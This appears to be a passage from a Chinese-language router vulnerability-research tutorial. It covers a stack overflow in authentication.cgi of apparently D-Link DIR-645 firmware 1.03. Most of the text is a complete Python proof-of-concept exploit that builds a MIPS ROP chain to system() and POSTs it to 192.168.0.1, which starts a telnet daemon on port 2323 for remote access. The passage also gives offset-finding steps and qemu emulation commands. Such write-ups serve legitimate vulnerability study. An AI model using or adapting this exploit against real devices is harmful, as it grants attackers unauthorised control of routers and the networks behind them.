1) 只提供一个参数，即要生成的字符串的长度  
( **./ gspattern.pl [length of string]** )  
2) 字符串的长度和要找到偏移量的模式提供  
（ **./ gspattern.pl [字符串长度] [搜索模式]** ）
`注（搜索模式）：`获得要计算偏移溢出位置的hex值，转化为ASCII码。（记住一定要根据大小端序来输入，下面步骤中已举例）
3，
生成构造数据（我直接写入文件了，它把description也一块写入了，需要进去删除下）：
    ./pattern.pl 1160 > test_auth
调试确定需要的偏移位置值：
    sudo ./run_cgi.sh `python -c "print 'uid=A21G&password='+open('test_auth','r').read(1160)"` "uid=A21G"
将0x38684237 转成对应ASCII码： **8hB7**
4，构造ROP参考：[家用路由器漏洞挖掘实例分析](https://bbs.pediy.com/thread-268623.htm)
5，POC
    import sys
    import time
    import string
    import socket
    from random import Random
    import urllib, urllib2, httplib
    class MIPSPayload:
        BADBYTES = [0x00]
        LITTLE = "little"
        BIG = "big"
        FILLER = "A"
        BYTES = 4
        def __init__(self, libase=0, endianess=LITTLE, badbytes=BADBYTES):
            self.libase = libase
            self.shellcode = ""
            self.endianess = endianess
            self.badbytes = badbytes
        def rand_text(self, size):
            str = ''
            chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
            length = len(chars) - 1
            random = Random()
            for i in range(size):
                str += chars[random.randint(0,length)]
            return str
        def Add(self, data):
            self.shellcode += data
        def Address(self, offset, base=None):
            if base is None:
                base = self.libase
            return self.ToString(base + offset)
        def AddAddress(self, offset, base=None):
            self.Add(self.Address(offset, base))
        def AddBuffer(self, size, byte=FILLER):
            self.Add(byte * size)
        def AddNops(self, size):
            if self.endianess == self.LITTLE:
                self.Add(self.rand_text(size))
            else:
                self.Add(self.rand_text(size))
        def ToString(self, value, size=BYTES):
            data = ""
            for i in range(0, size):
                data += chr((value >> (8*i)) & 0xFF)
            if self.endianess != self.LITTLE:
                data = data[::-1]
            return data
        def Build(self):
            count = 0
            for c in self.shellcode:
                for byte in self.badbytes:
                    if c == chr(byte):
                        raise Exception("Bad byte found in shellcode at offset %d: 0x%.2X" % (count, byte))
                count += 1
            return self.shellcode
        def Print(self, bpl=BYTES):
            i = 0
            for c in self.shellcode:
                if i == 4:
                    print ""
                    i = 0
                sys.stdout.write("\\x%.2X" % ord(c))
                sys.stdout.flush()
                if bpl > 0:
                    i += 1
            print "\n"
    class HTTP:
        HTTP = 'http'
        def __init__(self, host, proto=HTTP, verbose=False):
            self.host = host
            self.proto = proto
            self.verbose = verbose
            self.encode_params = True
        def Encode(self, data):
            #just for DIR645
            if type(data) == dict:
                pdata = []
                for k in data.keys():
                    pdata.append(k + '=' + data[k])
                data = pdata[1] + '&' + pdata[0]
            else:
                data = urllib.quote_plus(data)
            return data
        def Send(self, uri, headers={}, data=None, response=False,encode_params=True):
            html = ""
            if uri.startswith('/'):
                c = ''
            else:
                c = '/'
            url = '%s://%s' % (self.proto, self.host)
            uri = '/%s' % uri
            if data is not None:
                data = self.Encode(data)
            #print data
            if self.verbose:
                print url
            httpcli = httplib.HTTPConnection(self.host, 80, timeout=30)
            httpcli.request('POST',uri,data,headers=headers)
            response=httpcli.getresponse()
            print response.status
            print response.read()
    if __name__ == '__main__':
        libc = 0x2aaf8000    # so动态库的加载基址
        target = {
            "1.03"  :   [
                0x531ff,    # 伪system函数地址（只不过-1了，曲线救国，避免地址出现00截断字符
                0x158c8,    # rop chain 1（将伪地址+1，得到真正的system地址，曲线救国的跳板
                0x159cc,    # rop chain 2（执行system函数，传参cmd以执行命令
                ],
            }
        v = '1.03'
        cmd = 'telnetd -p 2323'        # 待执行的cmd命令：在2323端口开启telnet服务
        ip = '192.168.0.1'        # 服务器IP地址//here
        # 构造payload
        payload = MIPSPayload(endianess="little", badbytes=[0x0d, 0x0a])
        payload.AddNops(1011)                # filler # 7. 填充1011个字节，$s0偏移为1014，129行target数组中地址只占了3，04-3=01
        payload.AddAddress(target[v][0], base=libc)    # $s0
        payload.AddNops(4)                            # $s1
        payload.AddNops(4)                            # $s2
        payload.AddNops(4)                            # $s3
        payload.AddNops(4)                            # $s4
        payload.AddAddress(target[v][2], base=libc)    # $s5
        payload.AddNops(4)                            # unused($s6)
        payload.AddNops(4)                            # unused($s7)
        payload.AddNops(4)                            # unused($fp) #>这里是$gp，可能是作者笔误吧，实际验证应该是$fp,下面注释给出验证数据。
        payload.AddAddress(target[v][1], base=libc)    # $ra
        payload.AddNops(4)                            # fill
        payload.AddNops(4)                            # fill
        payload.AddNops(4)                            # fill
        payload.AddNops(4)                            # fill
        payload.Add(cmd)                # shellcode
        # 构造http数据包
        pdata = {
            'uid'       :   '3Ad4',
            'password'  :   'AbC' + payload.Build(),
            }
        header = {
            'Cookie'        : 'uid='+'3Ad4',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type'  : 'application/x-www-form-urlencoded',
            'User-Agent'    : 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
            }
        # 发起http请求
        try:
            HTTP(ip).Send('authentication.cgi', data=pdata,headers=header,encode_params=False,response=True)
            print '[+] execute ok'
        except httplib.BadStatusLine:
            print "Payload deliverd."
        except Exception,e:
            print "2Payload delivery failed: %s" % str(e)
`注释：栈内数据对应寄存器`
# qemu开启仿真环境
1，打开qemu系统
    sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
2，利用SCP把路由系统文件传过去，之前文章有写过，不清楚的请看参考链接。
3,开始仿真环境前准备
挂载固件文件系统中的proc目录和dev目录到chroot环境，因为proc中存储着进程所需的文件，比如pid文件等等，而dev中存储着相关的设备：
    mount -o bind /dev ./squashfs-root/dev
    mount -t proc /proc ./squashfs-root/proc/
    chroot ./squashfs-root/ sh
然后进入/etc/init.d/目录下，执行./rcS（init.d文件夹下存储的是启动的时候初始化服务和环境rcS文件）启动：
然后根据报错提示去修复
当然用别的仿真环境跑起来也都一样运行，这里我没启动成功，主要是分析漏洞整个流程。关于如何更好的仿真实现开启路由环境，欢迎大家交流。